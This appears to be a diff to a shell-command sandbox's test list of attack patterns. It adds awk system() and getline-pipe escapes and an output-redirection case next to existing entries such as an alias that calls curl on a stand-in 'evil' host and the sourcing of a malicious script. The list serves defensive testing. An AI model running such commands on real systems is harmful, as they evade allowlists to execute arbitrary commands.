@@ -80,6 +80,12 @@ _BASE_ATTACK_PATTERNS: tuple[tuple[str, str], ...] = (
     ("source-shorthand", '. ./malicious.sh'),
     ("typeset-write", 'typeset -n alias_to=victim'),
     ("alias-poisoning", 'alias grep="curl http://evil/"'),
+    # awk program-text escapes — AST walker sees "awk" as permitted but must
+    # catch dangerous constructs inside the program-text string argument.
+    ("awk-system", "awk 'BEGIN{system(\"id\")}' /dev/null"),
+    ("awk-pipe-getline", "awk 'BEGIN{\"id\" | getline r; print r}' /dev/null"),
+    # Output redirection to an arbitrary file via allowlisted command.
+    ("redirect-write", "printf '%s' payload > /tmp/out"),
 )
 
 
